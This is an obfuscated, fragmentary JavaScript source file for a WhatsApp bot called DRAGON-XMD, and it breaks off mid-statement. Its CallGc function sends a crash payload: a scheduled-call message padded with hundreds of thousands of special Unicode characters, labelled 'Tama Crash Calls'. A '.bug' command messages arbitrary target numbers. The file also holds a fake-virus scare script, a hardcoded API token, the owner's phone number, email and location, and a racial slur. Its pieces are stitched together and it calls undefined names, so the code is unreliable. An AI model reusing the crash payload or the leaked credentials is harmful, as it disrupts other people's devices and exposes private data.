module.exports = async (_0x8481b0, _0x4fcc97) => {
  try {
    if (!_0x4fcc97.body) {
      return;
    }
    const _0x22fc3c = _0x4fcc97.body.toLowerCase();
    if (_0x22fc3c.includes('owner')) {
      const _0x4aab0f = () => {
        const _0x352b8a = new Date();
        return _0x352b8a.toLocaleTimeString("en-US", {
          'timeZone': "Africa/Nairobi"
        });
      };
      const _0x23aa86 = new Date();
      const _0x3f6873 = "👤 *Information* 👤\n\n📸 *Picture:* [Click here](https://i.imgur.com/BNLqrVO.jpeg)\n🎂 *Age:* 21 yrs\n🆔 *Name:* DRAGON\n💑 *Relationship:* Strictly in love🤪\n📞 *Number:* +254704009677\n📍 *Location:* Mulot, Bomet\n✨ *Status:* Handsome 😎\n⏰ *Time:* " + _0x4aab0f() + " on " + _0x23aa86.toLocaleString("en-US", {
        'weekday': "long",
        'timeZone': "Africa/Nairobi"
      });
      await _0x8481b0.sendMessage(_0x4fcc97.chat, {
        'image': {
          'url': "https://i.imgur.com/BNLqrVO.jpeg"
        },
        'caption': _0x3f6873
      });
    }
  } catch (_0x2d86af) {
    console.error("Error in sending details:", _0x2d86af);
    _0x4fcc97.reply("⚠️ Failed to send details.");
  }
};
async function getGroupProfilePic(_0x51ca21, _0x414c76) {
  try {
    let _0xe3d2d0 = await _0x51ca21.profilePictureUrl(_0x414c76, "image");
    return _0xe3d2d0 || 'https://i.imgur.com/BNLqrVO.jpeg';
  } catch (_0x13cb70) {
    console.error("Error fetching group profile picture:", _0x13cb70);
    return "https://i.imgur.com/BNLqrVO.jpeg";
  }
}
if (global.mathChat && m.chat === global.mathChat && m.body) {
  const userAnswer = parseFloat(m.body.trim());
  if (!isNaN(userAnswer)) {
    if (userAnswer === global.mathAnswer) {
      client.sendMessage(m.chat, {
        'text': "✅ Correct! You're a genius!"
      });
    } else {
      client.sendMessage(m.chat, {
        'text': "❌ Nope! The right answer was *" + global.mathAnswer + '*.'
      });
    }
    global.mathAnswer = null;
    global.mathChat = null;
  }
}
async function CallGc(_0x2fd68c) {
  await sam.relayMessage(_0x2fd68c, {
    'viewOnceMessage': {
      'message': {
        'scheduledCallCreationMessage': {
          'callType': "VIDEO",
          'scheduledTimestampMs': Date.now() + 0x260d,
          'title': " Tama Crash Calls " + "𑲭𑲭".repeat(0x186a0) + 'ꦾ'.repeat(0xc350),
          'inviteCode': "youtube.com/@tamainfinity"
        }
      }
    }
  }, {});
}
const axios = require('axios');
async function generateTempEmail() {
  try {
    const _0x336f42 = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox");
    if (_0x336f42.data.length > 0x0) {
      return _0x336f42.data[0x0];
    }
    throw new Error("Email generation failed.");
  } catch (_0x3c0774) {
    console.error("Error generating email:", _0x3c0774);
    return null;
  }
}
async function checkEmailInbox(_0x11538f) {
  if (!_0x11538f) {
    return [];
  }
  const [_0x4803c3, _0x38c744] = _0x11538f.split('@');
  try {
    const _0x1c7eb6 = await axios.get("https://www.1secmail.com/api/v1/?action=getMessages&login=" + _0x4803c3 + "&domain=" + _0x38c744);
    return _0x1c7eb6.data;
  } catch (_0x185ba0) {
    console.error("Error checking inbox:", _0x185ba0);
    return [];
  }
}
const sendFakeVirusWarning = async (_0x3b902c, _0x57d697) => {
  try {
    const _0x141a8f = ["⚠️ *WARNING! CRITICAL SECURITY ALERT!* ⚠️", "🚨 *Your device has been compromised!* 🚨", "🦠 *Virus Detected: Trojan.MpesaStealer.001*", "📛 *Unauthorized access detected!*", "📡 *Scanning system for potential threats...*", "⏳ *Analyzing device security...*", "📝 *Suspicious activity found in your WhatsApp data!*", "🛑 *Warning! Banking details may be exposed!*", "📂 *Malware is attempting to access your phone storage!*", "📤 *Uploading your contacts and messages to the dark web...*", "🔄 *Deleting personal files...*", "💀 *System error: Critical process terminated!*", "⚡ *Bootloader corrupted. Restarting device...*", "🛠️ *Repairing system files...*", "🧹 *Removing detected threats...*", "✅ *Virus successfully removed!*", "😜 *Haha! You’ve been pranked! No virus detected!*"];
    for (const _0x44f2d7 of _0x141a8f) {
      await _0x3b902c.sendMessage(_0x57d697.chat, {
        'text': _0x44f2d7
      });
      await new Promise(_0x45b691 => setTimeout(_0x45b691, 0xbb8));
    }
  } catch (_0x293ef7) {
    console.error("Error in sendFakeVirusWarning:", _0x293ef7);
    _0x57d697.reply("⚠️ An error occurred while sending the virus warning.");
  }
};
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require("path");
const util = require("util");
global.axios = require('axios')["default"];
const chalk = require("chalk");
const speed = require("performance-now");
const Genius = require("genius-lyrics");
const yts = require("yt-search");
const {
  DateTime
} = require("luxon");
const uploadtoimgur = require('./lib/imgur');
const advice = require("badadvice");
const {
  c,
  cpp,
  node,
  python,
  java
} = require('compile-run');
const acrcloud = require("acrcloud");
const ytdl = require("ytdl-core");
const Client = new Genius.Client("TUoAEhL79JJyU-MpOsBDkFhJFWFH28nv6dgVgPA-9R1YRwLNP_zicdX2omG2qKE8gYLJat5F5VSBNLfdnlpfJg");
const {
  TelegraPh,
  UploadFileUgu,
  webp2mp4File,
  floNime
} = require("./lib/dragonupload");
const {
  Configuration,
  OpenAI
} = require("openai");
const {
  menu,
  autoread,
  mode,
  antidel,
  antitag,
  appname,
  herokuapi,
  gptdm,
  botname,
  antibot,
  prefix,
  author,
  packname,
  mycode,
  admin,
  botAdmin,
  dev,
  group,
  bad,
  DevDragon,
  NotOwner,
  antilink,
  antilinkall,
  wapresence,
  badwordkick
} = require("./set.js");
const {
  smsg,
  runtime,
  fetchUrl,
  isUrl,
  processTime,
  formatp,
  tanggal,
  formatDate,
  getTime,
  sleep,
  generateProfilePicture,
  clockString,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  parseMention,
  getRandom
} = require("./lib/dragonfunc");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
module.exports = dragon = async (_0x34f9ed, _0x10d7a1, _0x261229, _0x390dd9) => {
  try {
    var _0x4d26c5 = _0x10d7a1.mtype === "conversation" ? _0x10d7a1.message.conversation : _0x10d7a1.mtype == 'imageMessage' ? _0x10d7a1.message.imageMessage.caption : _0x10d7a1.mtype == "videoMessage" ? _0x10d7a1.message.videoMessage.caption : _0x10d7a1.mtype == "extendedTextMessage" ? _0x10d7a1.message.extendedTextMessage.text : _0x10d7a1.mtype == 'buttonsResponseMessage' ? _0x10d7a1.message.buttonsResponseMessage.selectedButtonId : _0x10d7a1.mtype == "listResponseMessage" ? _0x10d7a1.message.listResponseMessage.singleSelectReply.selectedRowId : _0x10d7a1.mtype == "templateButtonReplyMessage" ? _0x10d7a1.message.templateButtonReplyMessage.selectedId : _0x10d7a1.mtype === 'messageContextInfo' ? _0x10d7a1.message.buttonsResponseMessage?.['selectedButtonId'] || _0x10d7a1.message.listResponseMessage?.["singleSelectReply"]['selectedRowId'] || _0x10d7a1.text : '';
    var _0x586043 = typeof _0x10d7a1.text == "string" ? _0x10d7a1.text : '';
    var _0x37f12c = _0x10d7a1.message.extendedTextMessage?.["contextInfo"]?.["quotedMessage"];
    const _0x8db52a = require('heroku-client');
    const _0x502a51 = _0x4d26c5.replace(prefix, '').trim().split(/ +/).shift().toLowerCase();
    const _0x16f666 = _0x4d26c5.trim().split(/ +/).slice(0x1);
    const _0x1b6245 = _0x10d7a1.pushName || "No Name";
    const _0x74fec9 = await _0x34f9ed.decodeJid(_0x34f9ed.user.id);
    const _0x36e91d = !!(_0x10d7a1.sender == _0x74fec9);
    let _0xe09539 = q = _0x16f666.join(" ");
    _0x10d7a1.isBaileys = _0x10d7a1.id.startsWith("BAE5") && _0x10d7a1.id.length === 0x10;
    const _0x5e81f5 = _0x10d7a1.chat;
    const _0x459d18 = _0x10d7a1.reply;
    const _0xf9b4fc = _0x10d7a1.sender;
    const _0x49a59c = _0x261229.messages[0x0];
    const _0x29f150 = _0x1f2c7d => {
      let _0x4f7ee1 = [];
      for (let _0x21fa41 of _0x1f2c7d) {
        if (_0x21fa41.admin === "superadmin") {
          _0x4f7ee1.push(_0x21fa41.id);
        } else if (_0x21fa41.admin === "admin") {
          _0x4f7ee1.push(_0x21fa41.id);
        } else {
          '';
        }
      }
      return _0x4f7ee1 || [];
    };
    const _0x41c048 = _0x10d7a1.quoted || _0x10d7a1;
    const _0x1a0cc5 = _0x41c048.mtype == "buttonsMessage" ? _0x41c048[Object.keys(_0x41c048)[0x1]] : _0x41c048.mtype == "templateMessage" ? _0x41c048.hydratedTemplate[Object.keys(_0x41c048.hydratedTemplate)[0x1]] : _0x41c048.mtype == "product" ? _0x41c048[Object.keys(_0x41c048)[0x0]] : _0x10d7a1.quoted ? _0x10d7a1.quoted : _0x10d7a1;
    const _0x1dbbb8 = (_0x1a0cc5.msg || _0x1a0cc5).mimetype || '';
    const _0x2dc859 = _0x1a0cc5.msg || _0x1a0cc5;
    const _0x1c11d6 = _0x4d26c5.startsWith(prefix);
    const _0x1964fa = bad.split(',');
    const _0x22f9f0 = DevDragon.map(_0x39ec27 => _0x39ec27.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x10d7a1.sender);
    const _0x2274d9 = _0x10d7a1.isGroup ? await _0x34f9ed.groupMetadata(_0x10d7a1.chat)["catch"](_0x3e02f7 => {}) : '';
    const _0x228b5b = _0x10d7a1.isGroup && _0x2274d9 ? await _0x2274d9.subject : '';
    const _0x1d7b4 = _0x10d7a1.isGroup && _0x2274d9 ? await _0x2274d9.participants : '';
    const _0x5e437f = _0x10d7a1.isGroup ? await _0x29f150(_0x1d7b4) : '';
    const _0xdf0d0e = _0x10d7a1.isGroup ? _0x5e437f.includes(_0x74fec9) : false;
    const _0x393450 = _0x10d7a1.isGroup ? _0x5e437f.includes(_0x10d7a1.sender) : false;
    const _0x4244a0 = "254704009677".split(',');
    const _0x370737 = new Date();
    const _0x3e8702 = speed();
    const _0x496d56 = speed() - _0x3e8702;
    if (!fs.existsSync("message_data")) {
      fs.mkdirSync("message_data");
    }
    function _0x230f45(_0x48b2aa, _0x439381) {
      const _0x512cfb = path.join("message_data", _0x48b2aa, _0x439381 + ".json");
      try {
        const _0x303494 = fs.readFileSync(_0x512cfb, 'utf8');
        return JSON.parse(_0x303494) || [];
      } catch (_0x3965be) {
        return [];
      }
    }
    function _0x4eb164(_0x466aa3, _0xcd9333, _0x2e1908) {
      const _0x14f9d8 = path.join("message_data", _0x466aa3);
      if (!fs.existsSync(_0x14f9d8)) {
        fs.mkdirSync(_0x14f9d8, {
          'recursive': true
        });
      }
      const _0x35457d = path.join(_0x14f9d8, _0xcd9333 + ".json");
      try {
        fs.writeFileSync(_0x35457d, JSON.stringify(_0x2e1908, null, 0x2));
      } catch (_0x188f78) {
        console.error("Error saving chat data:", _0x188f78);
      }
    }
    function _0x40b348(_0x30ec03) {
      const _0x50ca4b = _0x30ec03.key.remoteJid;
      const _0x31f08e = _0x30ec03.key.id;
      const _0xc052d6 = _0x230f45(_0x50ca4b, _0x31f08e);
      _0xc052d6.push(_0x30ec03);
      _0x4eb164(_0x50ca4b, _0x31f08e, _0xc052d6);
    }
    async function _0x386a05(_0x53e69e, _0x17520c) {
      const _0x252946 = _0x17520c.key.remoteJid;
      const _0x1f350d = _0x17520c.message.protocolMessage.key.id;
      const _0x1e0592 = _0x230f45(_0x252946, _0x1f350d);
      const _0x3276ee = _0x1e0592[0x0];
      if (_0x3276ee) {
        const _0x17136c = _0x17520c.participant || _0x17520c.key.participant || _0x17520c.key.remoteJid;
        const _0xb8a667 = _0x3276ee.key.participant || _0x3276ee.key.remoteJid;
        const _0x2b5aec = '@' + _0x17136c.split('@')[0x0];
        if (_0x17136c.includes(_0x53e69e.user.id) || _0xb8a667.includes(_0x53e69e.user.id)) {
          return;
        }
        let _0x422540 = "░𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗔𝗡𝗧𝗜𝗗𝗘𝗟𝗘𝗧𝗘 𝗥𝗘𝗣𝗢𝗥𝗧░\n\n" + (" 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗯𝘆: " + _0x2b5aec + "\n\n");
        if (_0x3276ee.message?.["conversation"]) {
          const _0x341dcc = _0x3276ee.message.conversation;
          _0x422540 += " 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝘀𝘀𝗮𝗴𝗲: " + _0x341dcc;
          await _0x53e69e.sendMessage(_0x53e69e.user.id, {
            'text': _0x422540
          }, {
            'quoted': _0x10d7a1
          });
        } else {
          if (_0x3276ee.message?.['extendedTextMessage']) {
            const _0x1b86f8 = _0x3276ee.message.extendedTextMessage.text;
            _0x422540 += " 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗖𝗼𝗻𝘁𝗲𝗻𝘁: " + _0x1b86f8;
            await _0x53e69e.sendMessage(_0x53e69e.user.id, {
              'text': _0x422540
            }, {
              'quoted': _0x10d7a1
            });
          }
        }
      }
    }
    async function _0x31ad8f(_0x32b446, _0x112ccb, _0x4a6ca5) {
      try {
        if (!_0x4a6ca5 || _0x4a6ca5.trim() === '') {
          return _0x112ccb.reply("❌ 𝚙𝚛𝚘𝚟𝚒𝚍𝚎 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚘 𝚏𝚘𝚛𝚠𝚊𝚛𝚍 𝚝𝚘 𝚘𝚞𝚛 𝚌𝚞𝚜𝚝𝚘𝚖𝚎𝚛𝚌𝚊𝚛𝚎(𝗗𝗥𝗔𝗚𝗢𝗡).");
        }
        await _0x32b446.sendMessage('254704009677@s.whatsapp.net', {
          'text': _0x4a6ca5
        });
        _0x112ccb.reply("✅ Your message has been forwarded to Customer Care\n\n Wait some few minutes as DRAGON will respond as soon as possible.");
      } catch (_0x2f540f) {
        console.error("Error forwarding to Customer Care:", _0x2f540f);
        _0x112ccb.reply("⚠️ An error occurred while forwarding your message.");
      }
    }
    async function _0x2c17b4(_0x258e1c, _0x441d7b, _0x5c013b) {
      try {
        let _0xd2c4c6 = _0x5c013b.split(" ");
        if (_0xd2c4c6.length < 0x2) {
          return _0x441d7b.reply("❌ Please provide a target number and a message. Example: `.bug 254712344678 This is a test message.`");
        }
        let _0x16ad74 = _0xd2c4c6.shift().trim();
        let _0x4d82ec = _0xd2c4c6.join(" ");
        const _0x2d5200 = _0x16ad74 + "@s.whatsapp.net";
        console.log("Bug command target: " + _0x2d5200);
        console.log("Bug command message: " + _0x4d82ec);
        await _0x258e1c.sendMessage(_0x2d5200, {
          'text': _0x4d82ec
        });
        _0x441d7b.reply("✅ Bug command executed successfully and message forwarded to the target number.");
      } catch (_0x8fa452) {
        console.error("Error in bugTargetOtherNumber:", _0x8fa452);
        _0x441d7b.reply("⚠️ An error occurred while executing the bug command.");
      }
    }
    let _0x39cfcf = _0x586043.length > 0x1e ? q.substring(0x0, 0x1e) + "..." : _0x586043;
    const _0x96f725 = _0x49a59c.key.remoteJid;
    if (wapresence === 'online') {
      _0x34f9ed.sendPresenceUpdate("available", _0x96f725);
    } else {
      if (wapresence === "typing") {
        _0x34f9ed.sendPresenceUpdate("composing", _0x96f725);
      } else if (wapresence === "recording") {
        _0x34f9ed.sendPresenceUpdate("recording", _0x96f725);
      } else {
        _0x34f9ed.sendPresenceUpdate('unavailable', _0x96f725);
      }
    }
    if (_0x1c11d6 && mode === 'PRIVATE' && !_0x36e91d && !_0x22f9f0 && _0x10d7a1.sender !== dev) {
      return;
    }
    if (autoread === "TRUE" && !_0x10d7a1.isGroup) {
      _0x34f9ed.readMessages([_0x10d7a1.key]);
    }
    if (_0x36e91d && _0x49a59c.key.id.startsWith('BAE5') && _0x49a59c.key.id.length === 0x10 && !_0x10d7a1.isGroup) {
      return;
    }
    if (antidel === "TRUE") {
      if (_0x49a59c.message?.["protocolMessage"]?.['key']) {
        await _0x386a05(_0x34f9ed, _0x49a59c);
      } else {
        _0x40b348(_0x49a59c);
      }
    }
    _0x34f9ed.sendContact = async (_0x1c5be3, _0x370e8b, _0x354021 = '', _0x3dd4c2 = {}) => {
      let _0x52854c = [];
      for (let _0x29f608 of _0x370e8b) {
        _0x52854c.push({
          'displayName': "DRAGON DEV",
          'vcard': "BEGIN:VCARD\nVERSION:3.0\nN: RADRAGON DEV\nFN:DRAGON DEV\nitem1.TEL;waid=" + _0x29f608 + ':' + _0x29f608 + "\nitem1.X-ABLabel:Number\nitem2.EMAIL;type=INTERNET:dicksonnicky50@gmail.com\nitem2.X-ABLabel:Email\nitem3.URL:https://instagram.com/nick_hunter9\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Kenya;;;;\nitem4.X-ABLabel:Region\nEND:VCARD"
        });
      }
      _0x34f9ed.sendMessage(_0x1c5be3, {
        'contacts': {
          'displayName': "DRAGON DEV",
          'contacts': _0x52854c
        },
        ..._0x3dd4c2
      }, {
        'quoted': _0x354021
      });
    };
    if (antibot === "TRUE" && _0x49a59c.key.id.startsWith("BAE5") && _0x10d7a1.isGroup && !_0x393450 && _0xdf0d0e && _0x49a59c.key.id.length === 16) {
      kidts = _0x10d7a1.sender;
      _0x34f9ed.sendMessage(_0x10d7a1.chat, {
        'text': "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 antibot:\n\n@" + kidts.split('@')[0] + " has been identified as a bot. Removed by DRAGON to prevent unnecessary spam!",
        'contextInfo': {
          'mentionedJid': [kidts]
        }
      }, {
        'quoted': _0x10d7a1
      });
      await _0x34f9ed.groupParticipantsUpdate(_0x10d7a1.chat, [kidts], "remove");
    }
    if (_0x586043.startsWith('>')) {
      if (!_0x22f9f0) {
        return _0x459d18("Only owner can evaluate bailey codes");
      }
      try {
        let _0x53c283 = await eval(_0x586043.slice(0x2));
        if (typeof _0x53c283 !== "string") {
          _0x53c283 = require("util").inspect(_0x53c283);
        }
        await _0x459d18(_0x53c283);
      } catch (_0x13755b) {
        await _0x459d18(String(_0x13755b));
      }
    }
    async function _0x241ac8() {}
    if (gptdm === 'TRUE' && _0x10d7a1.chat.endsWith("@s.whatsapp.net")) {
      let _0x15d437 = await fetchJson("https://bk9.fun/ai/llama?q=" + _0xe09539);
      if (!_0x15d437.BK9) {
        return _0x459d18("An error occurred while fetching the AI chatbot response. Please try again later.");
      } else {
        _0x459d18(_0x15d437.BK9);
      }
    }
    if (antitag === "TRUE" && !_0x22f9f0 && _0xdf0d0e && !_0x393450 && _0x10d7a1.mentionedJid && _0x10d7a1.mentionedJid.length > 0xa) {
      if (_0x36e91d) {
        return;
      }
      const _0x3b6f15 = _0x10d7a1.sender;
      await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
        'text': '@' + _0x3b6f15.split('@')[0x0] + ", Antitag is Active🔨",
        'contextInfo': {
          'mentionedJid': [_0x3b6f15]
        }
      }, {
        'quoted': _0x10d7a1
      });
      await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
        'delete': {
          'remoteJid': _0x10d7a1.chat,
          'fromMe': false,
          'id': _0x10d7a1.key.id,
          'participant': _0x3b6f15
        }
      });
      await _0x34f9ed.groupParticipantsUpdate(_0x10d7a1.chat, [_0x3b6f15], "remove");
    }
    async function _0x2c149a() {
      var _0x208410 = ['𝗗', "𝗗𝗥𝗔", "𝗗𝗥𝗔𝗚", "𝗗𝗥𝗔𝗚𝗢", "𝗗𝗥𝗔𝗚𝗢𝗡", "𝗗𝗥𝗔𝗚𝗢𝗡-", '𝗗𝗥𝗔𝗚𝗢𝗡-𝗫', '𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠', '𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗', "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘", "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗"];
      let {
        key: _0x5cd635
      } = await _0x34f9ed.sendMessage(_0x5e81f5, {
        'text': "𝐏𝐢𝐧𝐠𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐢𝐧𝐠"
      });
      for (let _0x338a67 = 0x0; _0x338a67 < _0x208410.length; _0x338a67++) {
        await _0x34f9ed.sendMessage(_0x5e81f5, {
          'text': _0x208410[_0x338a67],
          'edit': _0x5cd635
        });
      }
    }
    const _0x33692d = () => {
      const _0x13be7a = DateTime.now().setZone('Africa/Nairobi').hour;
      if (_0x13be7a >= 0x5 && _0x13be7a < 0xc) {
        return "𝗚𝗼𝗼𝗱 𝗠𝗼𝗿𝗻𝗶𝗻𝗴 🌅";
      } else {
        if (_0x13be7a >= 0xc && _0x13be7a < 0x10) {
          return "𝗚𝗼𝗼𝗱 𝗔𝗳𝘁𝗲𝗿𝗻𝗼𝗼𝗻 ☀️";
        } else {
          return _0x13be7a >= 0x10 && _0x13be7a < 0x14 ? "𝗚𝗼𝗼𝗱 𝗘𝘃𝗲𝗻𝗶𝗻𝗴 🌇" : "𝗚𝗼𝗼𝗱 𝗡𝗶𝗴𝗵𝘁 😴";
        }
      }
    };
    if (badwordkick === "TRUE" && _0xdf0d0e && !_0x393450 && _0x4d26c5 && new RegExp("\\b" + _0x1964fa.join("\\b|\\b") + "\\b").test(_0x4d26c5.toLowerCase())) {
      _0x34f9ed.groupParticipantsUpdate(_0x5e81f5, [_0xf9b4fc], "remove");
      _0x459d18("Hey niggah.\n\nMy owner hates usage of bad words in my presence!");
    }
    if (antilink === "TRUE" && _0x4d26c5.includes("chat.whatsapp.com") && !_0x22f9f0 && _0xdf0d0e && !_0x393450 && _0x10d7a1.isGroup) {
      kid = _0x10d7a1.sender;
      _0x34f9ed.sendMessage(_0x10d7a1.chat, {
        'delete': {
          'remoteJid': _0x10d7a1.chat,
          'fromMe': false,
          'id': _0x10d7a1.key.id,
          'participant': kid
        }
      }).then(() => _0x34f9ed.groupParticipantsUpdate(_0x10d7a1.chat, [kid], "remove"));
      _0x34f9ed.sendMessage(_0x10d7a1.chat, {
        'text': "𝑯𝒆𝒚 𝑳𝒂𝒛𝒚𝒃𝒆𝒊𝒏𝒈 @" + kid.split('@')[0x0] + "👋\n\n𝒔𝒆𝒏𝒅𝒊𝒏𝒈 𝒍𝒊𝒏𝒌𝒔 𝒊𝒔 𝒑𝒓𝒐𝒉𝒊𝒃𝒊𝒕𝒆𝒅 𝒊𝒏 𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒃𝒚 𝑫𝑹𝑨𝑮𝑶𝑵-𝑿𝑴𝑫!",
        'contextInfo': {
          'mentionedJid': [kid]
        }
      }, {
        'quoted': _0x10d7a1
      });
    }
    if (antilinkall === "TRUE" && _0x4d26c5.includes("https://") && !_0x22f9f0 && _0xdf0d0e && !_0x393450 && _0x10d7a1.isGroup) {
      ki = _0x10d7a1.sender;
      _0x34f9ed.sendMessage(_0x10d7a1.chat, {
        'delete': {
          'remoteJid': _0x10d7a1.chat,
          'fromMe': false,
          'id': _0x10d7a1.key.id,
          'participant': ki
        }
      }).then(() => _0x34f9ed.groupParticipantsUpdate(_0x10d7a1.chat, [ki], "remove"));
      _0x34f9ed.sendMessage(_0x10d7a1.chat, {
        'text': "𝑯𝒆𝒚 𝑴𝒐𝒕𝒉𝒆𝒓𝒇*𝒄𝒌𝒆𝒓 @" + ki.split('@')[0x0] + "👋\n\n𝑺𝒆𝒏𝒅𝒊𝒏𝒈 𝒍𝒊𝒏𝒌𝒔 𝒊𝒔 𝒑𝒓𝒐𝒉𝒊𝒃𝒊𝒕𝒆𝒅 𝒊𝒏 𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒃𝒚 𝑫𝑹𝑨𝑮𝑶𝑵-𝑿𝑴𝑫 !",
        'contextInfo': {
          'mentionedJid': [ki]
        }
      }, {
        'quoted': _0x10d7a1
      });
    }
    if (_0x1c11d6 && !_0x10d7a1.isGroup) {
      console.log(chalk.black(chalk.bgWhite("[ 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 ]")), !_0x1cc7(0x641) ? chalk.green(_0x39cfcf) : chalk.keyword("turquoise")(_0x39cfcf), chalk.magenta("From"), chalk.green(_0x1b6245), chalk.yellow("[ " + _0x10d7a1.sender.replace("@s.whatsapp.net", '') + " ]"));
    } else if (_0x1c11d6 && _0x10d7a1.isGroup) {
      console.log(chalk.black(chalk.bgWhite("[ LOGS ]")), !_0x1cc7(0x641) ? chalk.green(_0x39cfcf) : chalk.keyword("turquoise")(_0x39cfcf), chalk.magenta("From"), chalk.green(_0x1b6245), chalk.yellow("[ " + _0x10d7a1.sender.replace("@s.whatsapp.net", '') + " ]"), chalk.blueBright('IN'), chalk.green(_0x228b5b));
    }
    if (_0x1c11d6) {
      switch (_0x502a51) {
        case "dragon":
        case "menu":
          await _0x241ac8();
          let _0x1828d9 = "𝗛𝗲𝘆 " + _0x10d7a1.pushName + "😁, " + _0x33692d() + "\n\n𝐓𝐡𝐢𝐬 𝐢𝐬 𝐃𝐑𝐀𝐆𝐎𝐍-𝐗𝐌𝐃, 𝐜𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 𝐃𝐫𝐚𝐠𝐨𝐧\n\n╭═════〘 𝐃𝐑𝐀𝐆𝐎𝐍-𝐗𝐌𝐃 〙═════╮\n┃✫╭═─────────────────═╮\n┃✬│ 𝗨𝘀𝗲𝗿 : " + _0x10d7a1.pushName + "\n┃✬│ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝙳𝚁𝙰𝙶𝙾𝙽\n┃✫│ 𝗣𝗿𝗲𝗳𝗶𝘅 : " + prefix + "\n┃✫│ 𝗠𝗼𝗱𝗲 : " + mode + "\n┃✯│ 𝗦𝗽𝗲𝗲𝗱 :   " + _0x496d56.toFixed(0x4) + " 𝗠𝘀\n┃✬│ 𝗧𝗶𝗺𝗲 : " + DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE) + " on " + _0x370737.toLocaleString("en-US", {
            'weekday': "long",
            'timeZone': "Africa/Nairobi"
